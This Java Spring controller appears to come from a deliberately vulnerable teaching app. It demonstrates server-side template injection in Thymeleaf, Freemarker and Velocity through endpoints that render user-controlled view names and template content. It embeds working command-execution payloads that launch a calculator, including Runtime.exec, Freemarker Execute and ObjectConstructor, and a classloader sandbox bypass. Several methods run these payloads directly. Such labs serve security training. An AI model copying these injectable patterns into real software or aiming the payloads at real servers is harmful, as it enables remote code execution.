package com.jvwac.jgvwa.controller;

import freemarker.cache.StringTemplateLoader;
import freemarker.template.Template;
import freemarker.template.TemplateException;
import io.swagger.annotations.ApiOperation;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;


import freemarker.template.Configuration;

import java.io.IOException;
import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;


@RequestMapping(value = "/ssti")
@Controller
public class SSTIController {

    @ApiOperation(value = "freemarker", notes = "")
    @RequestMapping(value = "/v1", method = RequestMethod.GET)
    public String V1(@RequestParam("content") String content, Model model) {
        model.addAttribute("content", content);
        return "ssti/freemarker/index";
    }


    @ApiOperation(value = "thymeleaf#path")
    @RequestMapping(value = "/v2", method = RequestMethod.GET)
    public String V2(@RequestParam("path") String path) {
        String poc = "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('gnome-calculator').getInputStream()).next()}__::.x";
        return path;
    }

    @ApiOperation(value = "thymeleaf#path")
    @GetMapping(value = "/v3/{path}")
    public void V3(@PathVariable String path) {
        String poc = "__${T(java.lang.Runtime).getRuntime().exec(\"gnome-calculator\")}__::.x";
    }

    @ApiOperation(value = "thymeleaf#fragment")
    @GetMapping(value = "/v4")
    public String V4(@RequestParam("fragment") String fragment) {
        String poc = "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('gnome-calculator').getInputStream()).next()}__::.x";
        return "ssti/thymeleaf/index :: " + fragment;
    }

    @ApiOperation(value = "thymeleaf#fragment")
    @GetMapping(value = "/v5")
    public String V5(@RequestParam("content") String content, Model model) {
        model.addAttribute("content", content);
        return "ssti/velocity/index";
    }

    @ApiOperation(value = "freemarker.template", notes = "https://mvnrepository.com/artifact/org.freemarker/freemarker/2.3.23")
    @RequestMapping(value = "/freemarker_example", method = RequestMethod.GET)
    @ResponseBody
    public String A1() throws IOException, TemplateException {
        Map<String, Object> map = new HashMap<>();
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_23);
        String poc1 = "${7*7}";
        String poc2 = "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"gnome-calculator\") }";
        // error
        String poc3 = "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"gnome-calculator\")</@value>";
        String poc4 = "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",\"gnome-calculator\").start()}";
        // error
        String poc5 = "<#assign classLoader=object?api.class.protectionDomain.classLoader>" + "<#assign clazz=classLoader.loadClass(\"ClassExposingGSON\")>" + "<#assign field=clazz?api.getField(\"GSON\")>" + "<#assign gson=field?api.get(null)>" + "<#assign ex=gson?api.fromJson(\"{}\", classLoader.loadClass(\"freemarker.template.utility.Execute\"))>" + "${ex(\"gnome-calculator\")}";
        StringTemplateLoader templateLoader = new StringTemplateLoader();
        templateLoader.putTemplate("template_name", poc2);
        cfg.setTemplateLoader(templateLoader);
        Template template = cfg.getTemplate("template_name");
        StringWriter stringWriter = new StringWriter();
        template.process(map, stringWriter);
        stringWriter.flush();
        stringWriter.close();
        return stringWriter.toString();
    }

    @ApiOperation(value = "org.apache.velocity.app.Velocity#evaluate", notes = "https://mvnrepository.com/artifact/org.apache.velocity/velocity/1.7")
    @RequestMapping(value = "/velocity_example", method = RequestMethod.GET)
    @ResponseBody
    public String A2() {
        String poc = "#set($e=\"e\");$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"gnome-calculator\")";
        Velocity.init();
        VelocityContext context = new VelocityContext();
        StringWriter stringWriter = new StringWriter();
        Velocity.evaluate(context, stringWriter, "TEST", poc);
        return stringWriter.toString();
    }
}
